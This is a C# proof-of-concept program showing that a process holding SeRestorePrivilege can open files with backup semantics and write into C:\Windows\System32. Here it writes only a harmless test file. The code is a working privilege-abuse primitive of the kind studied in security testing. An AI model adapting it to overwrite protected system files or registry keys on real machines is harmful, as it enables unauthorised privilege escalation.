using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SeRestorePrivilegePoC
{
    class SeRestorePrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,
            MaximumAllowed = 0x2000000,

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,
            FILE_LIST_DIRECTORY = 0x0001,
            FILE_WRITE_DATA = 0x0002,
            FILE_ADD_FILE = 0x0002,
            FILE_APPEND_DATA = 0x0004,
            FILE_ADD_SUBDIRECTORY = 0x0004,
            FILE_CREATE_PIPE_INSTANCE = 0x0004,
            FILE_READ_EA = 0x0008,
            FILE_WRITE_EA = 0x0010,
            FILE_EXECUTE = 0x0020,
            FILE_TRAVERSE = 0x0020,
            FILE_DELETE_CHILD = 0x0040,
            FILE_READ_ATTRIBUTES = 0x0080,
            FILE_WRITE_ATTRIBUTES = 0x0100,

            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS =
                StandardRightsRequired |
                Synchronize |
                0x1FF,
            FILE_GENERIC_READ =
                StandardRightsRead |
                FILE_READ_DATA |
                FILE_READ_ATTRIBUTES |
                FILE_READ_EA |
                Synchronize,
            FILE_GENERIC_WRITE =
                StandardRightsWrite |
                FILE_WRITE_DATA |
                FILE_WRITE_ATTRIBUTES |
                FILE_WRITE_EA |
                FILE_APPEND_DATA |
                Synchronize,
            FILE_GENERIC_EXECUTE =
                StandardRightsExecute |
                FILE_READ_ATTRIBUTES |
                FILE_EXECUTE |
                Synchronize
        }

        [Flags]
        enum EFileShare : uint
        {
            None = 0x00000000,
            Read = 0x00000001,
            Write = 0x00000002,
            Delete = 0x00000004
        }

        enum ECreationDisposition : uint
        {
            New = 1,
            CreateAlways = 2,
            OpenExisting = 3,
            OpenAlways = 4,
            TruncateExisting = 5
        }

        [Flags]
        enum EFileAttributes : uint
        {
            Readonly = 0x00000001,
            Hidden = 0x00000002,
            System = 0x00000004,
            Directory = 0x00000010,
            Archive = 0x00000020,
            Device = 0x00000040,
            Normal = 0x00000080,
            Temporary = 0x00000100,
            SparseFile = 0x00000200,
            ReparsePoint = 0x00000400,
            Compressed = 0x00000800,
            Offline = 0x00001000,
            NotContentIndexed = 0x00002000,
            Encrypted = 0x00004000,
            Write_Through = 0x80000000,
            Overlapped = 0x40000000,
            NoBuffering = 0x20000000,
            RandomAccess = 0x10000000,
            SequentialScan = 0x08000000,
            DeleteOnClose = 0x04000000,
            BackupSemantics = 0x02000000,
            PosixSemantics = 0x01000000,
            OpenReparsePoint = 0x00200000,
            OpenNoRecall = 0x00100000,
            FirstPipeInstance = 0x00080000
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        /*
         * P/Invoke : Windows APIs
         */
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(
            string lpFileName,
            EFileAccess dwDesiredAccess,
            EFileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            ECreationDisposition dwCreationDisposition,
            EFileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            int nNumberOfBytesToWrite,
            IntPtr lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        /*
         * Windows Consts
         */
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        /*
         * User defined function
         */
        static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        static bool CreateTestFileWithRestorePrivilege(string filePath)
        {
            int error;
            IntPtr hFile;
            byte[] messageBytes = Encoding.UTF8.GetBytes("This file is created for testing SeRestorePrivilege.");
            var status = false;

            do
            {
                hFile = CreateFile(
                    filePath,
                    EFileAccess.GenericRead | EFileAccess.GenericWrite,
                    EFileShare.None,
                    IntPtr.Zero,
                    ECreationDisposition.CreateAlways,
                    EFileAttributes.BackupSemantics,
                    IntPtr.Zero);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create {0}.", filePath);
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }

                status = WriteFile(hFile, messageBytes, messageBytes.Length, IntPtr.Zero, IntPtr.Zero);
                CloseHandle(hFile);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to write content to {0}.", filePath);
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] {0} is created successfully.", filePath);
                }
            } while (false);

            return status;
        }


        static void Main()
        {
            string filePath = @"C:\Windows\System32\SeRestorePrivilegeTestFile.txt";
            Console.WriteLine("[*] If you have SeRestorePrivilege, you can write privileged files and registries in the system.");
            Console.WriteLine("[*] This PoC tries to create file to {0}.", filePath);

            CreateTestFileWithRestorePrivilege(filePath);
        }
    }
}
